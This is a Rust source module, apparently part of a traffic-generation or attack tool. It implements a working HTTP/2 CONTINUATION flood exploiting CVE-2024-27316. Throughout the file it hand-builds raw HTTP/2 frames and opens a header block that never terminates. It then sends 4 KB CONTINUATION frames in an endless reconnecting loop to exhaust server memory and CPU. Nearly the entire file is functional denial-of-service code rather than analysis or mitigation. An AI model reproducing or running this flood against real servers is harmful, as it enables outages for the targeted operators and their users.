//! HTTP/2 CONTINUATION flood worker (L7) — CVE-2024-27316.
//!
//! Opens a stream with a HEADERS frame that omits END_HEADERS, then sends an
//! endless run of CONTINUATION frames (also without END_HEADERS). The header
//! block never terminates, so vulnerable servers append to their header buffer
//! without bound — memory/CPU exhaustion, often without the stream ever counting
//! against concurrency limits. Requires raw framing (the `h2` client API cannot
//! emit a never-ending header block), so we speak HTTP/2 on the wire directly.

use super::net::Target;
use super::{Governor, Metrics, Shutdown};
use std::sync::atomic::Ordering::Relaxed;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::AsyncWriteExt;

// Frame types / flags.
const FT_SETTINGS: u8 = 0x4;
const FT_HEADERS: u8 = 0x1;
const FT_CONTINUATION: u8 = 0x9;

/// Append one HTTP/2 frame (9-byte header + payload) to `buf`.
fn put_frame(buf: &mut Vec<u8>, ftype: u8, flags: u8, stream_id: u32, payload: &[u8]) {
    let len = payload.len();
    buf.push((len >> 16) as u8);
    buf.push((len >> 8) as u8);
    buf.push(len as u8);
    buf.push(ftype);
    buf.push(flags);
    buf.extend_from_slice(&(stream_id & 0x7fff_ffff).to_be_bytes());
    buf.extend_from_slice(payload);
}

pub async fn worker(
    idx: u32,
    target: Arc<Target>,
    metrics: Arc<Metrics>,
    gov: Arc<Governor>,
    shutdown: Arc<Shutdown>,
) {
    let mut down = shutdown.subscribe();

    // Everything below is static for the whole run — build once, reuse across
    // reconnects (no per-frame allocation in the hot loop).
    // Client connection preface, then an empty SETTINGS frame (required first),
    // then a HEADERS frame WITHOUT END_HEADERS to leave the block open.
    let mut init: Vec<u8> = Vec::with_capacity(64);
    init.extend_from_slice(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
    put_frame(&mut init, FT_SETTINGS, 0x0, 0, &[]);

    // Minimal HPACK header block: :method GET (0x82), :scheme https (0x87),
    // :path / (0x84), :authority <host> (literal, name index 1).
    let mut hblock: Vec<u8> = vec![0x82, 0x87, 0x84, 0x41];
    let host = target.host.as_bytes();
    hblock.push(host.len().min(126) as u8);
    hblock.extend_from_slice(&host[..host.len().min(126)]);
    put_frame(&mut init, FT_HEADERS, 0x0, 1, &hblock); // no END_HEADERS, no END_STREAM

    // A ~4 KB CONTINUATION frame of valid HPACK literal fields (never ending the
    // block). Sent repeatedly to keep the server buffering.
    let mut filler: Vec<u8> = Vec::with_capacity(4096);
    while filler.len() < 4096 {
        filler.extend_from_slice(&[0x40, 0x01, b'x', 0x01, b'y']);
    }
    let mut cont: Vec<u8> = Vec::with_capacity(4096 + 9);
    put_frame(&mut cont, FT_CONTINUATION, 0x0, 1, &filler); // no END_HEADERS

    loop {
        if *down.borrow() {
            return;
        }
        if !gov.active(idx) {
            tokio::select! {
                _ = down.changed() => {}
                _ = tokio::time::sleep(Duration::from_millis(100)) => {}
            }
            continue;
        }

        let mut io = match target.connect_h2().await {
            Ok(io) => io,
            Err(_) => {
                metrics.errors.fetch_add(1, Relaxed);
                tokio::select! {
                    _ = down.changed() => return,
                    _ = tokio::time::sleep(Duration::from_millis(50)) => {}
                }
                continue;
            }
        };

        if io.write_all(&init).await.is_err() {
            metrics.errors.fetch_add(1, Relaxed);
            continue;
        }
        metrics.bytes_sent.fetch_add(init.len() as u64, Relaxed);

        'flood: loop {
            if *down.borrow() || !gov.active(idx) {
                break 'flood;
            }
            if io.write_all(&cont).await.is_err() {
                metrics.errors.fetch_add(1, Relaxed); // server rejected the endless block
                break 'flood;
            }
            metrics.requests_sent.fetch_add(1, Relaxed);
            metrics.bytes_sent.fetch_add(cont.len() as u64, Relaxed);
        }
    }
}
